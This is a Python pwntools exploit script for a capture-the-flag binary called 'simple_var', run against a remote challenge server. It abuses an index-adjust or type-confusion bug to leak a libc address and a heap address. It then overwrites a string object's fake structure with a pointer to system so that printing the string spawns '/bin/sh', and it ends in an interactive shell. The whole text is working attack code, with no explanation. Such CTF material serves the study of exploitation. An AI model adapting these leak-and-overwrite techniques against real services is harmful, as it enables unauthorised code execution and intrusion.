from pwn import *
context(arch='amd64', log_level='debug')
# io = process('./simple_var')
elf = ELF('./simple_var')
libc = ELF('./libc.so.6')
io = remote('nep.lemonprefect.cn', 30327)

def create_string(index, strlen, content):
    io.sendlineafter(b'Input your choice:', b'1')
    io.sendlineafter(b'Input your choice:', b'1')
    io.sendlineafter(b'Input your string index:', str(index).encode())
    io.sendlineafter(b'Input your string length:', str(strlen).encode())
    io.sendlineafter(b'Input your string:', content)

def create_int(index, value):
    io.sendlineafter(b'Input your choice:', b'1')
    io.sendlineafter(b'Input your choice:', b'2')
    io.sendlineafter(b'Input your int index:', str(index).encode())
    io.sendlineafter(b'Input your value:', str(value).encode())

def create_bigint(index, value):
    io.sendlineafter(b'Input your choice:', b'1')
    io.sendlineafter(b'Input your choice:', b'3')
    io.sendlineafter(b'Input your bigInt index:', str(index).encode())
    io.sendlineafter(b'Input your value:', str(value).encode())

def create_array(index, size):
    io.sendlineafter(b'Input your choice:', b'2')
    io.sendlineafter(b'Input your array of variables index:', str(index).encode())
    io.sendlineafter(b'Input your array of variables number:', str(size).encode())

def add_to_array(arridx, varidx):
    io.sendlineafter(b'Input your choice:', b'4')
    io.sendlineafter(b'Input your array idx:', str(arridx).encode())
    io.sendlineafter(b'Input your var idx:', str(varidx).encode())

def show(index):
    io.sendlineafter(b'Input your choice:', b'3')
    io.sendlineafter(b'Input your idx:', str(index).encode())

def verify(offset):
    io.sendlineafter(b'Input your choice:', b'6')
    io.sendlineafter(b'Input idx adjust map:', str(offset).encode())

def edit_bigint(index, value):
    io.sendlineafter(b'Input your choice:', b'5')
    io.sendlineafter(b'Input your var idx:', str(index).encode())
    io.sendlineafter(b'Input your bigInt value:', str(value).encode())

def edit_int(index, value):
    io.sendlineafter(b'Input your choice:', b'5')
    io.sendlineafter(b'Input your var idx:', str(index).encode())
    io.sendlineafter(b'Input your int value:', str(value).encode())

def edit_array(varidx, arridx1, arridx2):
    io.sendlineafter(b'Input your choice:', b'5')
    io.sendlineafter(b'Input your var idx:', str(varidx).encode())
    io.sendlineafter(b'Input idx1:', str(arridx1).encode())
    io.sendlineafter(b'Input idx2:', str(arridx2).encode())

def edit_string(varidx, content):
    io.sendlineafter(b'Input your choice:', b'5')
    io.sendlineafter(b'Input your var idx:', str(varidx).encode())
    io.sendlineafter(b'Input your string:', content)

# io.recv()
# io.interactive()
create_int(0, 2)
create_array(1, 0)
add_to_array(0, 1)
create_int(2, 4)
add_to_array(0, 1)
verify(-9)
create_string(3, 0x60, b'/bin/sh'.ljust(0x60, b' '))
create_int(4, 1234)
edit_array(1, 4, 2)
show(3)
io.recvuntil(b'Content: ')
puts_addr = u64(io.recv(6) + b'\x00\x00')
base = puts_addr - libc.symbols['puts']
sys = base + libc.symbols['system']
print(hex(sys))

create_int(10, 2)
create_bigint(11, 0)
add_to_array(10, 1)
show(11)
io.recvuntil(b'Content: ')
buffer_addr = io.recvuntil(b'\n', drop=True)
buffer_addr = int(buffer_addr) - 0x10

payload = b'/bin/sh\x00'
payload += cyclic(0x8)
payload += b'string\x00\x00'
payload += p64(0x10)
payload += p64(buffer_addr + 0x20)
payload += p64(sys)

edit_string(3, payload)

show(3)

io.interactive()